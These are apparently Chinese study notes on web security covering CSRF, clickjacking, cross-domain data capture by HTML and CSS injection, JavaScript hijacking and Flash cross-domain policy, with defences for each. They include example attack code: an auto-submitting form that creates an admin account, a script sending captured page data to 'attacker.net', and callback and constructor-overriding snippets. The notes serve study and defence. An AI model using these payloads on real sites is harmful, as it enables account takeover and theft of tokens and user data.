<h4 id="跨站点请求伪造"><a href="#跨站点请求伪造" class="headerlink" title="跨站点请求伪造"></a>跨站点请求伪造</h4><blockquote>
<p>CSRF: cross site request forgery</p>
</blockquote>
<h5 id="攻击原理和示例"><a href="#攻击原理和示例" class="headerlink" title="攻击原理和示例"></a>攻击原理和示例</h5><p>攻击者通过创建一个看似无害的网站，然后放置一个指向目标网站的链接，诱使用户点击该链接，向目标网站发起请求，执行攻击者想要实现的恶意操作；</p>
<blockquote>
<p>同源策略并不会阻止 A 网站向 B 网站发起请求，但是它会阻止 A 网站的脚本处理 B 网站的响应；因此，CSRF 是一种单向的攻击；</p>
</blockquote>
<p>假设某个网站允许管理员用户发起一个请求来创建一名新用户，创建其设置的请求格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /auto/390/NewUserStep2.ashx HTTP/1.1</span><br><span class="line">Host: mdsec.net</span><br><span class="line">Cookie: SessionId=12346</span><br><span class="line">Content-Type: application/x-www-form-urleencoded</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">realname=daf&amp;username=daf&amp;userrole=admin&amp;password=letmein1&amp;confirmpassword=letmein1</span><br></pre></td></tr></table></figure>

<p>该请求由于以下三个方面的原因，导致其容易受到 CSRF 攻击</p>
<ul>
<li>该请求可以执行特权操作；</li>
<li>该请求仅依靠 cookie 来追踪会话，没有其他令牌或者无法预测的值；</li>
<li>除 cookie 外，请求中的所有其他参数值都是可以预测的；</li>
</ul>
<p>攻击者可以通过构建如下表单，诱使用户点击提交请求，达到攻击目的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https//mdsec.net/auth/390/NewUserStep2.ashx&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;realname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;daf&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;usernmae&quot;</span> <span class="attr">value</span>=<span class="string">&quot;daf&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userrole&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;letmein1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;confirmpassword&quot;</span> <span class="attr">value</span>=<span class="string">&quot;letmein1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>浏览器在发起跨域请求时，会自动带上目标网站的 cookie，导致攻击得以实现；</p>
</blockquote>
<h5 id="利用-CSRF-漏洞"><a href="#利用-CSRF-漏洞" class="headerlink" title="利用 CSRF 漏洞"></a>利用 CSRF 漏洞</h5><p>CSRF 漏洞常常出现在应用程序仅依赖 cookie 进行会话管理的场景；</p>
<p>渗透测试步骤</p>
<ul>
<li>解析应用程序的功能；</li>
<li>找到某项仅依赖 cookie 来追踪用户会话的敏感功能，确认功能的请求参数可以提前确认，不包含无法预测的数据；</li>
<li>创建一个无需交互操作即可发起请求的 HTML 页面（GET 请求可使用 img 标签；POST 请求则使用隐藏表单）；</li>
<li>登录应用程序后，使用同一个浏览器加载该 HTML 页面，确认应用程序的反应，看它是否执行所需要的操作；</li>
</ul>
<blockquote>
<p>假设应用程序的某个管理功能，接受某个用户标识符的参数（如用户id），然后会查询数据库，返回与该用户相关的信息，并显示在界面上；由于该功能仅管理员可用，而管理员本来就具有查看权限，因此开发者通常情况下不会对该功能做 CSRF 防御；</p>
<p>假设该功能的某个参数中，存在 SQL 注入漏洞，那么攻击者就会很有兴趣诱使非管理员用户去点击某个 CSRF 链接，发起请求，利用 SQL 注入漏洞，实现想要的查询；</p>
</blockquote>
<h5 id="CSRF-与登录"><a href="#CSRF-与登录" class="headerlink" title="CSRF 与登录"></a>CSRF 与登录</h5><p>案例2：家庭路由器</p>
<p>路由器通常有一个管理界面，上面有一些敏感操作，例如开放端口供外部访问；很多用户在购买路由器后，并不会修改上面的默认密码，而有不少设备厂家对设备使用通用密码，这使得攻击者可以提前知道默认密码是什么；如果用户之前登录过该路由器，攻击者可以设计一个看似无害的恶意 URL，诱使用户点击，之后向本地的路由器发起一个请求；该请求将携带之前用户登录时获得的令牌，从而路由器将接受攻击者的请求和参数，并进行处理；</p>
<p>案例3：文件上传与下载</p>
<p>某个应用程序提供文件上传和下载功能，由于文件是私有的，只能由上传者本人下载，因此开发者可能误以为该功能没有攻击的价值，从而没有设置足够的防御措施；攻击者可以设计第一个 URL，诱使用户点击，然后以攻击者提前注册好的账号密码登录目标网站；攻击者再设计第二个 URL，诱使用户点击，此时用户将以攻击者的身份，从而该网站上下载攻击者放置的恶意脚本文件，并执行它，实现攻击者的目标意图；(诱使受害者以攻击者的身份，下载攻击者上传的恶意文件)</p>
<h5 id="防止-CSRF-漏洞"><a href="#防止-CSRF-漏洞" class="headerlink" title="防止 CSRF 漏洞"></a>防止 CSRF 漏洞</h5><p>防止 CSRF 漏洞的一个办法是避免仅依赖 cookie 来追踪用户的会话，而应该增加一个隐藏表单字段，存放一个无法预测的随机值；当用户发起请求时，需要一起发送该字段值；服务器结合 cookie 和该字段值来确认用户的身份；</p>
<blockquote>
<p>某些应用程序将反 CSRF 令牌设置得过短，因为猜想攻击者如果使用蛮力攻击，短时间内提交过多无效令牌请求，那么请求程序将终止攻击者的会话，从而终止攻击。</p>
<p>以上思路虽然没错，但攻击者可以避开该方法，枚举所有可能的令牌值，然后分散放到不同用户的页面上，当某个链接被点击后，监控其服务端的响应，如果响应正常，则说明该令牌有效；之后攻击者就可以使用该令牌伪造用户身份发起请求；</p>
</blockquote>
<p>由于 CSRF 是单向攻击，有些开发者使用多阶段操作，来规避漏洞，其思路是即使攻击者伪造了第一阶段的请求，由于用户会收到响应，并在第二阶段确认操作是否无误，这时候就会发现异常，那么理论上就可以避免攻击者在第一阶段发起的操作直接生效；实际上攻击者经常直接第二个请求，完全不管第一个；或者当用户点击恶意链接后，攻击者按先后顺序同时发出两个请求即可；</p>
<h5 id="通过-XSS-突破-CSRF-防御"><a href="#通过-XSS-突破-CSRF-防御" class="headerlink" title="通过 XSS 突破 CSRF 防御"></a>通过 XSS 突破 CSRF 防御</h5><p>如果某个应用程序存在 XSS 漏洞，那么极大概率 CSRF 的防御机制将失效，因为攻击者通过 XSS 漏洞可以读取到任何需要的令牌值；</p>
<blockquote>
<p>除了反射型 XSS 漏洞外，因为利用该漏洞，首先需要发起一个请求，之后才能在响应中插入恶意代码；但如果此时有 CSRF 防御，那么意味着需要一个令牌才能让请求成功，于是这就变成了一个先有鸡还是先有蛋的问题；</p>
</blockquote>
<ul>
<li>如果应用程序存在任何保存型的 XSS 漏洞，那么攻击者可以利用这些漏洞直接突破 XSRF 防御；</li>
<li>由于 CSRF 防御令牌通常在整个会话期间都是一致的，这意味着如果有任何一个页面存在反射型 XSS 漏洞，同时缺少 CSRF 防御，那么攻击者就可以利用该漏洞取得令牌，让 CSRF 防御失效；</li>
<li>如果令牌与用户账号关联，而不是与会话关联，那么攻击者可以伪造表单，让受害者以自己的账号登录应用程序，下载恶意代码；然后假装意外退出账号，诱使受害者使用其自己的账号登录；由于恶意代码已经在本地运行，受害者在登录过程中和登录后都将受到攻击者的控制；</li>
<li>如果令牌与会话关联，但同时应用程序的 cookie 存在注入漏洞，那么攻击者将直接用自己的 cookie 和令牌替换受害者的 cookie 和令牌，下载恶意代码，之后的操作与上一步相同；</li>
</ul>
<blockquote>
<p>CSRF 防御可以在一定程度上保护 XSS 漏洞，但作用只有一点点，安全的做法还是应该修复所有的 XSS 漏洞；</p>
</blockquote>
<h3 id="UI-伪装"><a href="#UI-伪装" class="headerlink" title="UI 伪装"></a>UI 伪装</h3><p>UI 伪装的原理很简单，即攻击者的页面会使用 iframe 元素，将目标页面的内容加载到其中，这样该页面看起来像真的一样，以便能够诱使用户进行点击；但实际上，攻击者在该 iframe 元素上覆盖了一层透明层，用户看不见；当用户进行操作时，会误以为是在与目标程序进行交互，但实际是与攻击者设计的透明元素进行交互；虽然由于同源策略，攻击者无法读取令牌，但是透明元素向目标程序发起的请求，将自动携带有令牌，从而导致攻击者可以诱使用户做出一些该用户并不知情的操作；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210314090708.png"></p>
<p>攻击者还可以在其页面中设计各种诱使用户的操作，当用户进行操作时，攻击者使用脚本代码将这些操作传递到目标程序的页面，从而以用户的名义，向目标程序页面发送这些操作，并在用户不知情的情况下，最终向目标程序发起这些操作；</p>
<h4 id="破坏-iframe-防御"><a href="#破坏-iframe-防御" class="headerlink" title="破坏 iframe 防御"></a>破坏 iframe 防御</h4><p>为了防止 UI 伪装攻击，开发者在自己的页面加载后，会运行一段代码，检查自己的页面是否被浏览器加载到了一个 iframe 中，如果是的话，就终止服务，重定向的报错页面；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 检测并逃离 iframe 示例--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">	if (top.location != self.location) &#123;</span><br><span class="line">        top.location = self.location;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击者有多种方法可以避开上面这种简单的防御办法，包括如下：</p>
<ul>
<li>虽然攻击者的页面在顶层，控制着整个页面，因为攻击者可以有改变页面上一个变量的含义；当子 iframe 页面中的代码尝试访问这些变量时，会得不到预期的结果，例如: var location = 'foo'；</li>
<li>攻击者可以监听页面的 window.onBeforeUnload 事件，当页面加载后，就对目标程序的防御代码进行搜索和禁用；例如定义 sandbox 属性，从而禁用 iframe 页面中的脚本，同时保持 cookie 有效；</li>
</ul>
<h4 id="防止-UI-伪装"><a href="#防止-UI-伪装" class="headerlink" title="防止 UI 伪装"></a>防止 UI 伪装</h4><p>通过使用 X-Frame-Options 消息头，可以指示浏览器不将当前页面加载到 irame 中，从而实现对 UI 伪装的防御；该属性支持两个值，其意义分别如下：</p>
<ul>
<li>deny：拒绝所将页面插入 iframe 的尝试；</li>
<li>sameorigin：仅当前域名可插入，任何第三方域名都不用插入；</li>
</ul>
<blockquote>
<p>在测试是否存在 UI 伪装漏洞时，要同时检查一下移动设备的版本；因为移动设备上的表现经常跟 PC 端有所不同；</p>
</blockquote>
<h2 id="跨域捕获数据"><a href="#跨域捕获数据" class="headerlink" title="跨域捕获数据"></a>跨域捕获数据</h2><p>虽然同源策略可以限制 A 域的代码访问 B 域数据；但是仍然存在一些办法，可以实现这种访问；</p>
<h3 id="通过注入-HTML-捕获数据"><a href="#通过注入-HTML-捕获数据" class="headerlink" title="通过注入 HTML 捕获数据"></a>通过注入 HTML 捕获数据</h3><p>攻击者可以利用应用程序提供的功能，在其他用户收到的响应中注入一段有限的 HTML；在这种情况下，就可以利用 HTML 注入条件，向攻击者所在的域发送页面中的敏感数据（因为此时是在受害者打开的页面中，受害者发起的请求，是在应用程序的域中，因此不受到同源策略的影响）；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--假设应用程序通过设置隐藏表单进行 CSRF 防御，那么页面上一般会有如下的隐藏表单，用来发送令牌--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://app.com/forward_email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nonce&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2230313740821&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Forward&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> _StatsTRackerId=<span class="string">&#x27;AAE78RF27CB3210D&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    ...</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击者可以在该隐藏表单之前，找到一个插入点，注入以下文本：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315081459.png"></p>
<p>由于该文本也是一段 HTML 标签，但没有结束，那么在注入后，浏览器将在等号之后的文本中，寻找下一个单引号，以便进行配对；从而使得攻击者有机会将等号之后的内容，下一个单引号之前的内容，纳为其可注入的链接的参数的一部分；</p>
<p>当受害者点击该图片链接时向攻击的域发起请求时，受害者页面上的隐藏表单内容，将作为请求参数的组成部分，发送给攻击者的域，从而使得攻击者捕获了隐藏表单中的令牌；</p>
<p>另外一种攻击方法是在隐藏表单之前，注入以下的文本：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315081927.png"></p>
<p>由于该段文本是一段 HTML 标签的前半部分，但不包含结束标签；那么浏览器会一直往后寻找，直到找到配对的标签为止；那么原页面上的 form 起始标签将被忽略（相当于注释掉了），但表单中的内容仍然有效。此时隐藏表单相当于被修改了，原本表单是要向应用程序的域发起的请求，现在变成了向攻击者的域发起请求；</p>
<blockquote>
<p>第二种攻击方法注入的是合法且有效的 HTML 子集，因此很可能会避开潜在的输入确认机制；</p>
</blockquote>
<h3 id="通过注入-CSS-捕获数据"><a href="#通过注入-CSS-捕获数据" class="headerlink" title="通过注入 CSS 捕获数据"></a>通过注入 CSS 捕获数据</h3><p>注入 HTML 的缺点在于注入内容中需要使用尖括号，因此会被常见的过滤机制删除或者进行 HTML 编码，从而使得注入失效；因此，攻击者会转而采用注入 CSS 内容，来达到攻击目的；</p>
<p>攻击者在邮件的主题行中，设置如下内容的标题</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210315085442.png"></p>
<p>该内容在邮件中注入后变成如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Wao Inbox<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#125; *&#123;font-family: &#x27;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://app.com/forward_email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;nonce&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2230313740821&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Forward&quot;</span>&gt;</span></span><br><span class="line">            ...</span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">var</span> _StatsTRackerId=<span class="string">&#x27;AAE78RF27CB3210D&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            ...</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于注入的内容为 CSS，并且单引号未结束，浏览器将继续往下寻找单引号进行配对（直到 script 的变量定义部分找到）；两个单引号之间的内容变成了 font-family 的属性值；</p>
<blockquote>
<p>理论上 CSS 的属性值可以不需要使用单引号括起来，但为了避免在敏感数据之前出现分号，导致 CSS 属性值的长度被提前终止，未包含敏感数据，故在此处使用单引号，以便其和 script 中的引号进行配对，确认两个引号之间的内容包含了敏感数据；</p>
</blockquote>
<p>在完成了以上注入动作后，敏感数据已经包含在 font-family 属性；接下来攻击者再在邮件内容中插入一段脚本（此段内容属于攻击者的域），去读取 font-family 属性值，放在某个图片的 src 属性中；当用户点击该图片时，将触发图片上的 src 请求，发送敏感数据到攻击者的服务器；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://wao-mail.com/inbox&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;http://attacker.net/capture?&#x27;</span> + </span></span><br><span class="line"><span class="language-javascript">                   <span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">currentStyle</span>.<span class="property">fontFamily</span>) + <span class="string">&#x27;&quot;&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Javascript-劫持"><a href="#Javascript-劫持" class="headerlink" title="Javascript 劫持"></a>Javascript 劫持</h3><p>背景：虽然同源策略阻止 A 域的脚本读取 B 域的响应敏据，但是并没有限制 A 域可以包含来自 B  域的脚本代码，同时这些脚本代码允许在 A 域中执行；一种常见的使用场景是 A 引用 B 的静态脚本，例如 JQuery；</p>
<p>由于静态脚本代码本来是公开的，其中并不包含敏感数据，所以一般这种做法并不会带来危险；但是今天很多应用程序使用脚本代码来传输敏感数据，有些应用程序甚至还允许动态插入脚本，因此，攻击者从中可以找到一些漏洞机会；</p>
<h4 id="函数回调"><a href="#函数回调" class="headerlink" title="函数回调"></a>函数回调</h4><p>假设某个应用程序在页面上引用某个脚本文件，来处理某个用户点击事件；当点击事件发生时，会执行该脚本文件中的代码，向服务端发起用户信息请求，并在收到响应后，调用脚本中的 showUserInfo 回调函数来处理响应中的用户敏感数据；</p>
<p>针对以上情形，攻击者可以设计一个网页，在其中隐蔽放上一个诱使用户进行点击的链接，同时引用目标程序的脚本，但自定义一个自己的 showUserInfo 函数；当点击发生时，引用的脚本会向目标程序请求用户数据；如果在点击之前，用户恰好已对登录过目标程序，则该请求将是有效的；得到响应后，由于回调函数已经被攻击者定义的函数覆盖，响应将由攻击者定义的脚本进行处理，从而捕获用户的敏感数据；</p>
<blockquote>
<p>有个困惑：攻击者引用目标程序脚本并覆盖回调函数，该脚本向目标网站 B 域发起请求，那么返回的响应是否能够被攻击者设计的网页 A 域进行处理？</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">showUserInfo</span> (<span class="params">x</span>) &#123; <span class="title function_">alert</span>(x); &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://target_app.net/source.ashx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h4><p>应用程序经常使用 JSON 作为数据的传输格式，JSON 本质上是一堆字符串，因此浏览器在接收到该字符串后，需要对其进行解析；攻击者可以在自定义页面中，对 Javascript 内置数据类型的构造函数进行修改，从而改变解析 JSON 的结果</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--攻击者在自定义页面中重置 Array 构造函数--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">capture</span>(<span class="params">s</span>) &#123; <span class="title function_">alert</span>(s); &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">Array</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>[i] setter = capture;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://target_app.net/source.ashx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>为了提高用户体验，很多开发者会使用 AJAX 向服务端请求数据，并在前端使用脚本处理响应，更新局部网页；假设应用程序在响应中的某个变量放置了临时令牌，用来反 CSRF；那么攻击者可以自定义网页中先引用应用程序的公开脚本，然后再定义自己的脚本去读取该变量，捕获敏感数据；</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--假设应用程序的脚本中，定义了如下变量用于保存临时令牌--&gt;</span></span><br><span class="line">...</span><br><span class="line">nonce = &#x27;adfa313EFAa00eEF#2j&#x27;;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--攻击者可以在引用应用程序的脚本后，再自定义函数捕获该变量--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://target_app.com/status&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(nonce)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>变量可能在脚本中的不同位置进行定义，存在作用域的问题；因此攻击者需要了解应用程序脚本内部的逻辑，并进行模仿，以便能准确捕获；</p>
</blockquote>
<h4 id="E4X"><a href="#E4X" class="headerlink" title="E4X"></a>E4X</h4><p>E4X 是指 ECMAScript 进行扩展，增加了对 XML 的支持，但这种支持也引入了新的漏洞；例如 E4X 允许在 Javascript 中直接使用 XML 语法，同时还允许在 XML 中嵌入代码；</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="string">&#x27;&lt;bar&gt;&#123; prompt(&quot;Please enter the value of bar&quot;) &#125;&lt;/bar&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这种特性存在两个漏洞：</p>
<ul>
<li>XML 标签将被注释成为值，导致原本的逻辑失效；</li>
<li>{ } 块中的文本由于作为 javascript 代码执行，因此可用来对 XML 数据进行初始化；</li>
</ul>
<p>攻击者可以适当的位置注入文本，插入任意的 {...} 块，用于捕获敏感数据；</p>
<h4 id="防止-Javascript-劫持"><a href="#防止-Javascript-劫持" class="headerlink" title="防止 Javascript 劫持"></a>防止 Javascript 劫持</h4><ul>
<li>使用令牌，进行 CSRF 防御；</li>
<li>在引用脚本中故意引入无效或有问题的 Javascript 代码（例如无限循环），从而破坏攻击者的引用；而实际的动态代码会使用 XMLHttpRequest 对问题脚本进行预处理，删除其中的问题代码；</li>
<li>使用 POST 请求来获得动态脚本代码，而不是传统的 GET 请求；这样可以避免攻击者使用 script 标签引用脚本；</li>
</ul>
<h2 id="同源策略深入讨论"><a href="#同源策略深入讨论" class="headerlink" title="同源策略深入讨论"></a>同源策略深入讨论</h2><h3 id="同源策略与浏览器扩展"><a href="#同源策略与浏览器扩展" class="headerlink" title="同源策略与浏览器扩展"></a>同源策略与浏览器扩展</h3><p>大多数浏览器扩展都会实施一定程度的同源策略，但是它们之间还是存在一些轻微的区别，有时候这种区别会引入一些不易察觉的漏洞；</p>
<h4 id="同源策略与-Flash"><a href="#同源策略与-Flash" class="headerlink" title="同源策略与 Flash"></a>同源策略与 Flash</h4><p>Flash 有个特性，即它的源是由加载 Flash 对象的 URL 所有在域决定的，而不是由加载 Flash 对象的 HTML 页面的 URL 决定的；例如在 A 网站的 HTML 页面，加载了 B 网站的 Flash 对象，则该 Flash 对象的源指向 B 网站；该 Flash 对象会与同一来源的对象或者后端进行交互，同时还可以调用浏览器的 URLRequest API 提出跨域请求（但不能读取响应）；</p>
<p>Flash 有另外一个特征，即对象源可以通过发布策略文件，对来自其他域的 Flash 对象进行授权，以完成双向的交互；当某个来源于 A 网站 Flash 对象，尝试对 B 网站发起跨域请求时，浏览器会检查 B网站的策略文件，看是否接受来自 A 网站的请求；</p>
<blockquote>
<p>策略文件一般放在根目录下的 crossdomain.xml 文件中</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210316090308.png"></p>
<p>渗透测试步骤：</p>
<p>不管目标程序是否使用 Flash，都应该检查一下 crossdomain.xml 文件，因为通常在该文件中存放着跨域的策略；如果目标程序 A 有在该文件中向域 B 授权，那么来自域 B 的 Flash 对象有权与 A 进行交互；</p>
<ul>
